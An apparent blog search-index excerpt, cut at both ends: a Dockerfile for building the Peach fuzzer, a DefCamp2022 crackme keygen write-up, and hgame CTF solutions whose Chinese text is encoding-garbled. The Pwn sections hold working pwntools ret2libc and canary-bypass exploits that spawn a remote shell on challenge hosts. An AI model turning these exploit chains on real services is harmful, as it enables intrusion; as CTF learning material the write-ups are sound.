\u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.153 githubstatus.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;64.71.144.211 github.community\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 media.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 objects.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 raw.github.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts # Get specific mono packages WORKDIR /protocol-fuzzer-ce/paket/.paket RUN wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.bootstrapper.exe RUN wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.targets RUN wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.exe RUN wget https://github.com/fsprojects/Paket/releases/download/5.257.0/Paket.Restore.targets WORKDIR /protocol-fuzzer-ce # Download new PIN and change PIN version in build config RUN wget https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.20-98437-gf02b61307-gcc-linux.tar.gz RUN mv pin-3.20-98437-gf02b61307-gcc-linux.tar.gz 3rdParty/pin/ RUN cd 3rdParty/pin/ \u0026amp;\u0026amp; tar -xf pin-3.20-98437-gf02b61307-gcc-linux.tar.gz RUN sed -i s/pin-3.19-98425-gcc-linux/pin-3.20-98437-gf02b61307-gcc-linux/g build/config/linux.py # \u0026amp;\u0026amp; \\ # mv pin-3.20-98437-gf02b61307-gcc-linux pin-3.2-98437-gcc-linux #RUN sed -i s/pin-3.19-98425-gcc-linux/pin-3.2-98437-gcc-linux/g build/config/linux.py #RUN cd 3rdParty/pin/ \u0026amp;\u0026amp; tar xzf pin-3.20-98437-gf02b61307-gcc-linux.tar.gz \u0026amp;\u0026amp; \\ # mv pin-3.20-98437-gf02b61307-gcc-linux pin-3.2-98437-gcc-linux #RUN sed -i s/pin-3.2-81205-gcc-linux/pin-3.20-98437-gf02b61307-gcc-linux/g build/config/linux.py # Install specific mono for compiling # RUN apt install dirmngr gnupg apt-transport-https ca-certificates -y RUN apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF RUN echo \u0026#34;deb https://download.mono-project.com/repo/ubuntu stable-bionic main\u0026#34; \u0026gt; /etc/apt/sources.list.d/mono-official-stable.list RUN apt-get update -y RUN apt-get install -y mono-devel RUN mozroots --import --sync RUN mono --version # Patch bblocks.cpp # https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce/-/issues/1 # https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce/-/merge_requests/7 RUN sed -i \u0026#39;/^int main.*/itemplate\u0026lt;bool b\u0026gt;\\nstruct StaticAssert {};\\ntemplate \u0026lt;\u0026gt;\\nstruct StaticAssert\u0026lt;true\u0026gt;\\n{\\n static void myassert() {}\\n};\\n\u0026#39; core/BasicBlocks/bblocks.cpp RUN sed -i \u0026#39;s/STATIC_ASSERT(sizeof(size_t) == sizeof(ADDRINT))/StaticAssert\u0026lt;sizeof(size_t) == sizeof(ADDRINT)\u0026gt;::myassert()/g\u0026#39; core/BasicBlocks/bblocks.cpp # Patch BaseProgram.cs error CS0219: Warning as Error: The variable `config\u0026#39; is assigned but its value is never used # https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce/-/issues/3 RUN sed -i \u0026#39;s/var config = new LicenseConfig();/\\/\\/var config = new LicenseConfig();/g\u0026#39; pro/Core/Runtime/BaseProgram.cs # Configure and build RUN ./waf configure RUN ./waf build # Downgrade mono back to 4.x for installation and runtime # The installed mono version 6.12.0.122 (tarball Mon Feb 22 17:33:15 UTC 2021) is not supported. # Ensure mono version 4.x and not 4.4 is installed and try again. RUN apt purge -y mono* libmono* doxygen \u0026amp;\u0026amp; \\ rm /etc/apt/sources.list.d/mono-official-stable.list RUN apt update -y RUN apt install -y mono-complete RUN ./waf install RUN cp -r output/linux_x86_64_release/bin /peach RUN cp -r output/doc/sdk /peach/doc ","date":"2022-06-03T00:38:33+08:00","image":"/post/how-to-build-peach-fuzzer-on-ubuntu1804/cover_huf30455e1e7e8d123d3b218bed06ae75a_2847003_120x120_fill_q75_box_smart1.jpg","permalink":"/post/how-to-build-peach-fuzzer-on-ubuntu1804/","title":"How to build peach fuzzer on Ubuntu18.04"},{"content":"can-you-crack-this The main function reads the input and constrains the length.\nv11 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Enter your public key: \u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v11, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::operator\u0026gt;\u0026gt;\u0026lt;char\u0026gt;(\u0026amp;std::cin, public_key); if ( (unsigned __int64)std::string::length(public_key) \u0026gt;= 20 ) { v9 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Enter serial key:\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v9, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::operator\u0026gt;\u0026gt;\u0026lt;char\u0026gt;(\u0026amp;std::cin, serial_key); v8 = 4 * std::string::length(public_key) - 1; if ( v8 == std::string::length(serial_key) ) { std::string::basic_string(str_public_key, public_key); std::string::basic_string(str_serial_key, serial_key); v6 = verify_serial((__int64)str_public_key, (__int64)str_serial_key); std::string::~string(str_serial_key); std::string::~string(str_public_key); if ( v6 ) { v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Serial accepted.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v5, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } else { v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Try harder.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v4, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } v17 = 0; v14 = 1; } else { v7 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Invalid serial length.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v7, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v17 = 0; v14 = 1; } } else { v10 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Invalid length.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v10, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v17 = 0; v14 = 1; } It requires that the two input strings satisfy the constraint len(serial) = len(publik_key) * 4 - 1 and passes the two strings into the verify_serial() function.\n_BOOL8 __fastcall verify_serial(__int64 a1, __int64 a2) { __int64 v2; // rsi __int64 v3; // rax const char *v4; // rax __int64 v6; // [rsp+10h] [rbp-C0h] bool v7; // [rsp+1Bh] [rbp-B5h] char *char_from_pb_key; // [rsp+20h] [rbp-B0h] char v10[24]; // [rsp+38h] [rbp-98h] BYREF char sub_serial[28]; // [rsp+50h] [rbp-80h] BYREF int v12; // [rsp+6Ch] [rbp-64h] __int64 count; // [rsp+70h] [rbp-60h] char sub_serial_v12[24]; // [rsp+88h] [rbp-48h] BYREF __int64 pos_v13; // [rsp+A0h] [rbp-30h] __int64 v16; // [rsp+A8h] [rbp-28h] char v17[28]; // [rsp+B0h] [rbp-20h] BYREF _BOOL4 v18; // [rsp+CCh] [rbp-4h] std::string::basic_string\u0026lt;std::nullptr_t\u0026gt;(v17, \u0026#34;-\u0026#34;); v16 = 0LL; pos_v13 = 0LL; std::string::basic_string((__int64)sub_serial_v12); count = 0LL; while ( 1 ) { pos_v13 = std::string::find(a2, v17, 0LL); if ( pos_v13 == -1 ) break; ++count; if ( pos_v13 != 3 ) { v18 = 0; v12 = 1; goto L_EXIT; } std::string::substr(sub_serial, a2, 0LL, 3LL); std::string::operator=((__int64)sub_serial_v12, (__int64)sub_serial); std::string::~string(sub_serial); std::string::basic_string(v10, sub_serial_v12); v2 = v16++; char_from_pb_key = (char *)std::string::at(a1, v2); v7 = !verify_char(v10, *char_from_pb_key); std::string::~string(v10); if ( v7 ) { v18 = 0; v12 = 1; goto L_EXIT; } v6 = pos_v13; v3 = std::string::length(v17); std::string::erase(a2, 0LL, v3 + v6); } if ( count == 19 ) { v4 = (const char *)std::string::c_str(a2); v18 = strncmp(v4, \u0026#34;bss\u0026#34;, 3uLL) == 0; } else { v18 = 0; } v12 = 1; L_EXIT: std::string::~string(sub_serial_v12); std::string::~string(v17); return v18; } This function splits the Serial Key into 20 parts by - and requires each part to be 3 in length, ending with bss.\nThe three characters of each Serial Key part and one Public Key character in the corresponding position are passed to the verify_char() function.\n_BOOL8 __fastcall verify_char(char *a1, char a2) { const char *v2; // rax int v3; // eax unsigned __int64 v5; // [rsp+0h] [rbp-20h] __int64 v6; // [rsp+8h] [rbp-18h] __int64 v7; // [rsp+10h] [rbp-10h] v2 = (const char *)std::string::c_str(a1); v7 = strtol(v2, 0LL, 16); v6 = fib(v7); // fib / 100 v5 = v6; do { do --v5; while ( !check_arm(v5) ); } while ( (unsigned int)notused(v5) || v5 \u0026gt; 0x10E47F4C575565LL ); if ( v7 \u0026gt;= 100 ) { if ( (unsigned int)isprint(a2) ) { v3 = UN++; used[v3] = v5; return v5 \u0026amp;\u0026amp; v6 \u0026amp;\u0026amp; v5 != v6 \u0026amp;\u0026amp; (v6 - v5) % 100 == a2; } } return 0; } This function first converts the hex string (format of input) to int, then uses fib() to calculate the value of that index in the Fibonacci series and divides it by 100 to return v6.\nThe check_arm() function is as follows\n_BOOL8 __fastcall check_arm(__int64 a1) { return (countSetBits(a1) \u0026amp; 1) == 1; } __int64 __fastcall countSetBits(__int64 a1) { unsigned int v2; // [rsp+0h] [rbp-Ch] v2 = 0; while ( a1 ) { a1 \u0026amp;= a1 - 1; ++v2; } return v2; } countSetBits() is used to calculate the number of 1 in the binary form of the argument, so the number of 1 is odd to exit the inner do while loop. For the outer loop, the number v5 must be less than 0x10E47F4C575565, and notused() will record the previous v5 and cannot be reused.\nIn addition, since v6 - v5 \u0026gt; 0x20 (isprint(a2) and (v6 - v5) % 100 == a2) is required, it is obvious that the upper limit of v5 needs to be used in the construction. So that the value of v5 in 20 calculations can be determined, and the Serial Key and Public Key can be constructed by finding (v6, a2) that match the condition.\n#include \u0026lt;stdio.h\u0026gt; unsigned long long fib(unsigned long long x) { long long v5[4096]; v5[0] = 0; v5[1] = 1; for (int i = 2; i \u0026lt;= x; i++) v5[i] = v5[i - 1] + v5[i - 2]; return v5[x] / 100uLL; } long long countSetBits(long long x) { unsigned int v2 = 0; while (x) { x \u0026amp;= x - 1; v2++; } return v2; } int check_arm(unsigned long long x) { return (countSetBits(x) \u0026amp; 1) == 1; } void next(long long *v5) { do { --*v5; } while (!check_arm(*v5)); return; } int main() { unsigned long long v7; long long v5 = 0x10E47F4C575565LL; int serial[105]; int public[105]; for (int i = 0; i \u0026lt; 20; i++){ next(\u0026amp;v5); for (int j = 100; j \u0026lt; 0x1000; j++){ long long tmp = (fib(j) - v5) % 100; // add constraints of fib(j) \u0026gt; 0x10E47F4C575565LL is better if (tmp \u0026gt; 0x20){ serial[i] = j; public[i] = tmp; break; } } } printf(\u0026#34;Public Key: \u0026#34;); for (int i = 0; i \u0026lt; 20; i++) printf(\u0026#34;%c\u0026#34;, public[i]); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Serial Key: \u0026#34;); for (int i = 0; i \u0026lt; 19; i++) printf(\u0026#34;%03x-\u0026#34;, serial[i]); printf(\u0026#34;bss\\n\u0026#34;); return 0; } // Public Key: ;=\u0026gt;ABDGH#%\u0026amp;(+-.12479 // Serial Key: 066-066-066-066-066-066-066-066-064-064-064-064-064-064-064-064-064-064-064-bss ","date":"2022-02-14T23:08:32+08:00","image":"/post/defcamp2022-can-you-crack-this-wp/cover_huce52bdd0a85d719a9e95a81ea04327da_778452_120x120_fill_q75_box_smart1.jpg","permalink":"/post/defcamp2022-can-you-crack-this-wp/","title":"DefCamp2022 can-you-crack-this Writeup"},{"content":"Week1 [RE]easyasm é¢˜ç›®è¯´ asmï¼Œé‚£å°±ç¡¬çœ‹æ±‡ç¼–å‘—\nå¾ªç¯å³ç§» 4 ä½ï¼Œç„¶åå¼‚æˆ– 0x17\ncipher = [ 0x91, 0x61, 0x01, 0xC1, 0x41, 0xA0, 0x60, 0x41, 0xD1, 0x21, 0x14, 0xC1, 0x41, 0xE2, 0x50, 0xE1, 0xE2, 0x54, 0x20, 0xC1, 0xE2, 0x60, 0x14, 0x30, 0xD1, 0x51, 0xC0, 0x17 ] def ror(x): return (x \u0026gt;\u0026gt; 4) | (x \u0026lt;\u0026lt; 4) \u0026amp; 0xff for c in cipher: print (chr(ror(c ^ 0x17)), end=\u0026#39;\u0026#39;) # hgame{welc0me_to_4sm_w0rld} [RE]creakme int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // edx int i; // esi unsigned int v5; // edi unsigned int v6; // ebx int v7; // esi int v8; // esi _DWORD v10[17]; // [esp+Ch] [ebp-8Ch] BYREF _BYTE v11[32]; // [esp+50h] [ebp-48h] char Arglist[32]; // [esp+70h] [ebp-28h] BYREF int v13; // [esp+90h] [ebp-8h] int v14; // [esp+94h] [ebp-4h] memset(Arglist, 0, sizeof(Arglist)); sub_40103A(\u0026#34;%s\u0026#34;, (char)Arglist); strcpy((char *)v10, \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;); v3 = 0; v14 = 0; for ( i = 0; i \u0026lt; 32; v14 = i ) { v5 = *(_DWORD *)\u0026amp;Arglist[i]; v6 = *(_DWORD *)\u0026amp;Arglist[i + 4]; v13 = 0; v7 = 32; do { v3 += 0x12345678; v5 += v3 ^ (v3 + v6) ^ (v10[2] + 16 * v6) ^ (v10[3] + (v6 \u0026gt;\u0026gt; 5)); v6 += v3 ^ (v3 + v5) ^ (v10[0] + 16 * v5) ^ (v10[1] + (v5 \u0026gt;\u0026gt; 5)); --v7; } while ( v7 ); v8 = v14; v3 = 0; *(_DWORD *)\u0026amp;Arglist[v14] = v5; *(_DWORD *)\u0026amp;Arglist[v8 + 4] = v6; i = v8 + 8; } *(_OWORD *)v11 = *(_OWORD *)dword_402180; *(_OWORD *)\u0026amp;v11[16] = dword_402170; while ( Arglist[v3] == v11[v3] ) { if ( ++v3 \u0026gt;= 32 ) { sub_40100C(\u0026#34;right!\u0026#34;, v10[0]); return 0; } } sub_40100C(\u0026#34;wrong!\u0026#34;, v10[0]); return 0; } é‚£ä¸€ä¸²å­—ç¬¦ä¸²çœ‹ä¼¼å’Œ Base64 æœ‰å…³ï¼Œå…¶å®åŠ å¯†å°±æ˜¯ TEA\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void decrypt (uint32_t* v, uint32_t* k) { uint32_t delta=0x12345678; uint32_t v0=v[0], v1=v[1], sum=delta * 32, i; uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i\u0026lt;32; i++) { v1 -= sum ^ ((v0\u0026lt;\u0026lt;4) + k0) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k1); v0 -= sum ^ ((v1\u0026lt;\u0026lt;4) + k2) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k3); sum -= delta; } v[0]=v0; v[1]=v1; } int main() { uint32_t v[]={1222194312u, 51123276u, 1391163586u, 3986482669u, 2921328102u, 3126465133u, 3482485930u, 1709241059u},k[4]={0x44434241,0x48474645,0x4c4b4a49,0x504f4e4d}; decrypt(v, k); decrypt(v + 2, k); decrypt(v + 4, k); decrypt(v + 8, k); printf(\u0026#34;%s\u0026#34;, v); return 0; } [RE]Flag Checker jeb æ‰“å¼€\npackage com.example.flagchecker; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.util.Base64; import android.view.View.OnClickListener; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; public class MainActivity extends AppCompatActivity { public static byte[] encrypt(String arg4, String arg5) throws Exception { SecretKeySpec v0 = new SecretKeySpec(arg5.getBytes(), 0, arg5.length(), \u0026#34;RC4\u0026#34;); Cipher v5 = Cipher.getInstance(\u0026#34;RC4\u0026#34;); v5.init(1, v0); return v5.doFinal(arg4.getBytes()); } @Override // android.support.v7.app.AppCompatActivity protected void onCreate(Bundle arg2) { super.onCreate(arg2); this.setContentView(0x7F09001C); // layout:activity_main ((Button)this.findViewById(0x7F070022)).setOnClickListener(new View.OnClickListener() { // id:button @Override // android.view.View$OnClickListener public void onClick(View arg4) { String v4 = ((EditText)MainActivity.this.findViewById(0x7F070036)).getText().toString(); // id:editTextTextPersonName byte[] v2 = new byte[0]; try { v2 = MainActivity.encrypt(v4, \u0026#34;carol\u0026#34;); } catch(Exception v4_1) { v4_1.printStackTrace(); } if(Base64.encodeToString(v2, 0).replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;).equals(\u0026#34;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=\u0026#34;)) { Toast.makeText(MainActivity.this, \u0026#34;Congratulations!!!\u0026#34;, 1).show(); return; } Toast.makeText(MainActivity.this, \u0026#34;Fail,try again.\u0026#34;, 1).show(); } }); } } RC4 + Base64\nfrom base64 import * from Crypto.Cipher import ARC4 cipher = b64decode(b\u0026#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=\u0026#39;) key = b\u0026#39;carol\u0026#39; rc4 = ARC4.new(key) rc4.decrypt(cipher) # b\u0026#39;hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}\u0026#39; [RE]çŒ«å¤´é¹°æ˜¯ä¸æ˜¯çŒ« åšäº†ä¸¤æ¬¡çŸ©é˜µä¹˜æ³•ï¼Œæ±‚è§£æ–¹æ³•æ˜¯å…ˆæŠŠä¸¤ä¸ªå¸¸æ•°çŸ©é˜µä¹˜èµ·æ¥ï¼Œç„¶åç”¨ z3 æ±‚è§£\n[Pwn]enter_the_pwn_land ç»å…¸ ret2libc\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;chuj.top\u0026#34;, 34671) # p = process(b\u0026#39;./a.out\u0026#39;) pop_rdi_ret = 0x401313 pop_rsi_r15_ret = 0x401311 puts_got = 0x404020 puts_plt = 0x401090 test_thread = 0x4011B6 main = 0x401260 ret = 0x40101a pre_payload = b\u0026#39;a\u0026#39; * (0x30 - 0x4) + b\u0026#39;\\x2c\u0026#39; + b\u0026#39;\\x00\u0026#39; * 3 + b\u0026#39;b\u0026#39; * 8 payload = pre_payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) p.sendline(payload) p.recvline() puts_addr = u64(p.recvline()[:-1] + b\u0026#39;\\x00\\x00\u0026#39;) print (hex(puts_addr)) puts_offset = 0x875A0 binsh_offset = 0x1B75AA system_offset = 0x55410 libc_addr = puts_addr - puts_offset binsh_addr = libc_addr + binsh_offset system_addr = libc_addr + system_offset payload = pre_payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) p.sendline(payload) p.recvline() p.interactive() [Pwn]enter_the_evil_pwn_land è¿™é“é¢˜ç›®çš„éš¾ç‚¹åœ¨äº Canary çš„ç»•è¿‡ï¼Œç”¨åˆ°äº†ä¸€ä¸ª ptrace çš„ç‰¹æ€§ï¼ŒCanary å­˜å‚¨åœ¨ TLS ä¸­ï¼Œptrace æ—¶ TLS è·ç¦»æ ˆè¾ƒè¿‘ï¼Œæ‰€ä»¥åªéœ€è¦ç–¯ç‹‚å¾€åè¦†ç›–å°±è¡Œï¼Œæˆ‘è¿™é‡Œè¦†ç›–äº† 0x900 ä½\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;chuj.top\u0026#34;, 35131) # p = process(\u0026#39;./a.out\u0026#39;) pop_rdi_ret = 0x401363 pop_rsi_r15_ret = 0x401361 puts_got = 0x404020 puts_plt = 0x4010A0 test_thread = 0x4011D6 main = 0x4012A3 ret = 0x40101a # gdb.attach(p, \u0026#39;thread 2\\nb *0x401245\u0026#39;) pre_payload = b\u0026#39;a\u0026#39; * 0x28 + b\u0026#39;c\u0026#39; * 8 + b\u0026#39;b\u0026#39; * 8 payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(test_thread) p.sendline(pre_payload + payload + b\u0026#39;c\u0026#39; * 0x900) print (p.recvline()) puts_addr = u64(p.recvline()[:-1] + b\u0026#39;\\x00\\x00\u0026#39;) puts_offset = 0x875A0 binsh_offset = 0x1B75AA execv_offset = 0xE6450 libc_addr = puts_addr - puts_offset binsh_addr = libc_addr + binsh_offset execv_addr = libc_addr + execv_offset payload = p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(execv_addr) p.sendline(pre_payload + payload + b\u0026#39;c\u0026#39; * 0x900) p.interactive() æ­¤å¤–ï¼Œè¿™é¢˜è¿˜å­¦åˆ°äº† gdb è°ƒè¯• threads çš„æŠ€å·§ info threads å¯ä»¥æŸ¥çœ‹å½“å‰çš„çº¿ç¨‹ï¼Œthread i å¯ä»¥åˆ‡æ¢åˆ°ç¬¬ i ä¸ªçº¿ç¨‹\n[Pwn]test_your_gdb å…ˆè°ƒè¯•æ‹¿åˆ° passwordï¼Œç„¶åå°±æ˜¯ç®€å•çš„ ret2text äº†\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # p = process(b\u0026#39;./a.out\u0026#39;) p = remote(\u0026#34;chuj.top\u0026#34;, 50748) payload = b\u0026#39;\\x47\\xf1\\x94\\x82\\x0e\\x1e\\x36\\xb0\\xa9\\xa6\\xd8\\x4e\\xc3\\xe0\\x09\\x8c\u0026#39; # gdb.attach(p) p.recvuntil(b\u0026#39;pass word\\n\u0026#39;) p.send(payload) p.recv(0x18) canary = p.recv(8) p.recv(0x100 - 0x20) payload = b\u0026#39;a\u0026#39; * 0x18 + canary + b\u0026#39;b\u0026#39; * 8 + p64(0x401256) p.sendline(payload) p.interactive() Week2 [RE]xD MAZE ä¸€ç»´çš„è¿·å®«ï¼Œç›´æ¥ç”¨ vscode çš„å°æŠ€å·§è½¬æˆ flag\né€‰ä¸­ 512 ä¸ª # å’Œåé¢çš„ä¸€ä¸ªç©ºæ ¼ï¼Œç„¶å CTRL+SHIFT+L å…¨é€‰ï¼Œæ¢æˆ 3ï¼Œä»¥æ­¤ç±»æ¨\n[RE]upx magic 0 æŠŠæ‰€æœ‰å¯è§å­—ç¬¦éƒ½ç®—ä¸€éï¼Œç„¶åæ˜ å°„å›å»å°±è¡Œ\ndef crc(x): x \u0026lt;\u0026lt;= 8 for i in range(8): if x \u0026amp; 0x8000 != 0: x = (x * 2) ^ 0x1021 else: x *= 2 x \u0026amp;= 0xffff return x a = [] for i in range(0x0, 0x80): a.append(crc(i)) cipher = [ 0x8D68, 0x9D49, 0x2A12, 0xAB1A, 0xCBDC, 0xB92B, 0x2E32, 0x9F59, 0xDDCD, 0x9D49, 0xA90A, 0xE70, 0xF5CF, 0xA50, 0x5AF5, 0xFF9F, 0x9F59, 0xBD0B, 0x58E5, 0x3823, 0xBF1B, 0x78A7, 0xAB1A, 0x48C4, 0xA90A, 0x2C22, 0x9F59, 0x5CC5, 0x5ED5, 0x78A7, 0x2672, 0x5695 ] for c in cipher: print (chr(a.index(c)), end=\u0026#39;\u0026#39;) # noW_YOu~koNw-UPx~mAG|C_@Nd~crC16 [RE]upx magic 1 å‘ç°æ²¡æ³•è‡ªåŠ¨è„±å£³ï¼Œ010 æ‰“å¼€ä¹‹åï¼Œæ‰‹åŠ¨æŠŠä¸‰ä¸ª UPX? æ”¹æˆ UPX!ï¼Œä¹‹åå°±èƒ½è‡ªåŠ¨è„±å£³äº†\n[RE]fake shell RC4 + init æ›´æ¢å¯†é’¥\ntarget = [ 0xB6, 0x94, 0xFA, 0x8F, 0x3D, 0x5F, 0xB2, 0xE0, 0xEA, 0x0F, 0xD2, 0x66, 0x98, 0x6C, 0x9D, 0xE7, 0x1B, 0x08, 0x40, 0x71, 0xC5, 0xBE, 0x6F, 0x6D, 0x7C, 0x7B, 0x09, 0x8D, 0xA8, 0xBD, 0xF3, 0xF6 ] from Crypto.Cipher import ARC4 rc4 = ARC4.new(b\u0026#39;w0wy0ugot1t\u0026#39;) rc4.decrypt(bytes(target)) # b\u0026#39;hgame{s0meth1ng_run_bef0r_m4in?}\u0026#39; æˆ–è€…ç›´æ¥åŠ¨è°ƒä¹Ÿè¡Œ\n[RE]creakme2 åœ¨åŠ å¯†å‡½æ•°é‡Œçœ‹ä¸€ä¸‹æ±‡ç¼–ï¼Œå‘ç°ç”¨äº† try except æ¥æ„é€ äº†ä¸€ä¸ªé™¤ 0 å¼‚å¸¸ï¼Œå½“æœ€é«˜ä½ä¸º 0 æ—¶ï¼Œå¼‚æˆ–ä¸€ä¸ª 0x1234567\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B1; for (i=0; i \u0026lt; num_rounds; i++) { v0 += (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); sum += delta; if (sum \u0026gt;\u0026gt; 31 == 0) sum ^= 0x1234567; printf(\u0026#34;%x\\n\u0026#34;, sum); v1 += (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); } v[0]=v0; v[1]=v1; printf(\u0026#34;%x\\n\u0026#34;, sum); } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B1, sum=0xc78e4d05; for (i=0; i \u0026lt; num_rounds; i++) { v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); if (sum \u0026gt;\u0026gt; 31 == 0) sum ^= 0x1234567; sum -= delta; printf(\u0026#34;%x\\n\u0026#34;, sum); v0 -= (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); } v[0]=v0; v[1]=v1; } int main() { uint32_t v[]={0x457E62CF, 0x9537896C, 0x1F7E7F72, 0xF7A073D8, 0x8E996868, 0x40AFAF99, 0xF990E34, 0x196F4086}; uint32_t const k[4]={1,2,3,4}; unsigned int r=32; decipher(r, v, k); decipher(r, v + 2, k); decipher(r, v + 4, k); decipher(r, v + 6, k); printf(\u0026#34;%s\\n\u0026#34;,v); return 0; } [Crypto]The Password Plus Pro Max Ultra è¿›è¡Œäº†ä¸€ä¸‹æ•°å­¦æ¨å¯¼\nç»“è®ºå°±æ˜¯åš 64 æ¬¡åŠ å¯†å°±å›æ¥äº†\næœ€åæ±‚è§£\nfrom functools import reduce from operator import xor from random import sample from re import findall from libnum import s2n def move(n, k): s = bin(n)[2:].zfill(64) k \u0026amp;= 63 return int(s[k:] + s[:k], 2) def encrypt(x, ks): return xor(x, reduce(xor, map(lambda k: move(x, k), ks))) def decrypt(x, ks): for _ in range(63): x = encrypt(x, ks) return x ks = [[8, 35], [19, 29, 30, 45], [6, 16, 18, 21, 44, 55], [10, 26, 30, 46, 51, 54, 58, 63], [5, 13, 25, 29, 37, 39, 43, 52, 53, 59], [1, 26, 31, 39, 40, 41, 43, 45, 49, 52, 54, 62], [8, 12, 19, 20, 30, 32, 34, 40, 41, 45, 46, 49, 55, 58], [2, 3, 5, 6, 8, 10, 15, 19, 26, 27, 33, 40, 42, 47, 52, 61], [1, 16, 17, 27, 28, 30, 32, 36, 37, 38, 39, 48, 49, 51, 55, 57, 59, 62], [5, 11, 12, 20, 22, 23, 25, 27, 31, 32, 33, 37, 44, 45, 49, 52, 53, 59, 61, 62], [2, 7, 10, 12, 18, 19, 20, 22, 26, 29, 33, 34, 38, 40, 41, 45, 46, 51, 54, 56, 57, 60], [3, 4, 5, 9, 12, 13, 18, 19, 21, 23, 24, 25, 30, 33, 34, 35, 37, 39, 43, 44, 46, 49, 50, 53], [1, 3, 6, 7, 10, 11, 13, 14, 23, 27, 32, 33, 35, 37, 39, 41, 46, 48, 49, 50, 51, 53, 54, 56, 58, 62]] xs = [2656224875120172108 , 1261711348908201279 , 18219282869614004824, 15279054981769814589, 7966355346882200701 , 5641592208539483808 , 1502927090219059154 , 3996223120734273799 , 